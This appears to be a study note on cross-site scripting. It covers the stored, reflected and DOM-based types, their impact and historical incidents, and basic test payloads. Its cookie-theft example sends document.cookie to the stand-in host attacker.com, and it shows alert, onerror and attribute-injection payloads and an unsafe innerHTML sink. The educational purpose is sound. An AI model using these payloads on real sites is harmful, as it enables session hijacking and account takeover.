# Cross-Site Scripting (XSS) – Types of XSS

## What is XSS

Cross-Site Scripting (XSS) is a client-side vulnerability that allows attackers to inject malicious JavaScript into web pages viewed by other users.

When an application fails to properly sanitize or encode user input, attackers can insert JavaScript that executes inside the victim's browser.

Unlike SQL Injection:

```
XSS targets the browser, not the database
```

Execution occurs within the victim’s session context.

---

# How XSS Works

Normal flow:

1. User submits input to web application
2. Application processes input
3. Application displays content in browser

If input is not sanitized:

```
attacker injects JavaScript
```

Browser executes injected code automatically.

---

# Example Scenario

Comment field:

```
Great post!
```

Attacker submits:

```html
<script>alert('XSS')</script>
```

When another user views the page:

```
JavaScript executes in their browser
```

---

# Why XSS is Dangerous

JavaScript running in the victim’s browser can:

- steal session cookies
- perform actions as the victim
- modify webpage content
- capture keystrokes
- send API requests
- redirect users
- load malicious content
- perform phishing attacks

---

# Example Attack – Cookie Theft

```html
<script>
fetch("http://attacker.com/log?cookie=" + document.cookie)
</script>
```

Result:

```
attacker receives victim session cookie
```

Possible outcome:

```
account takeover
```

---

# XSS Impact

Although XSS executes client-side, impact can still be severe:

- account compromise
- privilege escalation
- credential theft
- CSRF token theft
- browser exploitation
- malware delivery
- session hijacking

Risk level:

```
Medium–High likelihood
Moderate–High impact
```

---

# Same-Origin Policy Consideration

Injected JavaScript executes within the vulnerable domain:

```
same permissions as victim
```

Allows access to:

- cookies (unless HttpOnly)
- DOM content
- local storage
- session tokens
- API calls

---

# Real-World XSS Incidents

### Samy Worm (MySpace – 2005)

Stored XSS worm that spread automatically.

Payload message:

```
Samy is my hero
```

Spread to over:

```
1 million users in < 24 hours
```

---

### TweetDeck XSS (Twitter – 2014)

Self-retweeting payload:

```
38,000 retweets in < 2 minutes
```

Forced Twitter to temporarily disable TweetDeck.

---

### Google Search XSS (2019)

XSS vulnerability discovered in XML parsing library.

Demonstrates:

```
even mature applications are vulnerable
```

---

# Types of XSS

There are three primary XSS categories.

---

# 1. Stored XSS (Persistent XSS)

## Description

Malicious payload is:

```
stored in backend database
```

Executed whenever users view the stored content.

---

## Common Locations

- comment sections
- forums
- user profiles
- messaging systems
- support tickets
- blog posts
- product reviews

---

## Example Payload

```html
<script>alert(document.cookie)</script>
```

---

## Attack Flow

1. attacker submits payload
2. payload stored in database
3. victim visits page
4. browser executes JavaScript

---

## Risk Level

Highest risk XSS type.

Reasons:

- persistent
- affects multiple users
- difficult to detect
- scalable attack vector

---

# 2. Reflected XSS (Non-Persistent)

## Description

Payload is:

```
reflected immediately in server response
```

Not stored in database.

---

## Common Locations

- search boxes
- error messages
- login forms
- URL parameters
- contact forms

---

## Example URL

```
http://example.com/search?q=<script>alert(1)</script>
```

---

## Attack Flow

1. attacker crafts malicious link
2. victim clicks link
3. server reflects payload
4. browser executes script

---

## Typical Delivery Methods

- phishing emails
- malicious links
- social engineering
- shortened URLs

---

# 3. DOM-Based XSS

## Description

Payload processed entirely in the browser:

```
never sent to server
```

Vulnerability exists in client-side JavaScript.

---

## Common Sources

- URL fragments (#)
- JavaScript variables
- client-side rendering
- document.write()
- innerHTML usage

---

## Example vulnerable code

```javascript
document.getElementById("output").innerHTML = location.hash;
```

---

## Malicious URL

```
http://example.com/#<script>alert(1)</script>
```

---

## Attack Flow

1. victim opens crafted link
2. browser processes input
3. DOM updated with malicious code
4. JavaScript executes

---

# Comparison of XSS Types

| Type | Stored on Server | Requires Victim Interaction | Execution Location |
|------|-----------------|----------------------------|-------------------|
| Stored XSS | Yes | No | Browser |
| Reflected XSS | No | Yes | Browser |
| DOM XSS | No | Yes | Browser |

---

# Key Indicators of XSS Vulnerabilities

Look for user input appearing in:

- page output
- HTML attributes
- JavaScript variables
- URL parameters
- DOM elements
- JSON responses

---

# Typical Test Payloads

Basic detection:

```html
<script>alert(1)</script>
```

---

HTML injection:

```html
<b>test</b>
```

---

attribute injection:

```html
" onmouseover="alert(1)
```

---

image event handler:

```html
<img src=x onerror=alert(1)>
```

---

# Impact Examples

### session hijacking

```javascript
document.cookie
```

---

### keylogging

```javascript
document.onkeypress
```

---

### forced actions

```javascript
fetch('/change-password')
```

---

### phishing overlay

```javascript
document.body.innerHTML
```

---

# Key Takeaways

- XSS executes JavaScript in victim browser
- does not directly compromise server
- can lead to account takeover
- extremely common vulnerability class
- often chained with other attacks
- proper input validation is critical

---

# Quick Reference

## stored XSS

payload stored in database

---

## reflected XSS

payload returned in HTTP response

---

## DOM XSS

payload executed in browser DOM

---

## basic test payload

```html
<script>alert(1)</script>
```

---

# Tags

#xss  
#stored-xss  
#reflected-xss  
#dom-xss  
#web-security  
#owasp  
#pentesting  
#javascript  
#client-side  
#obsidian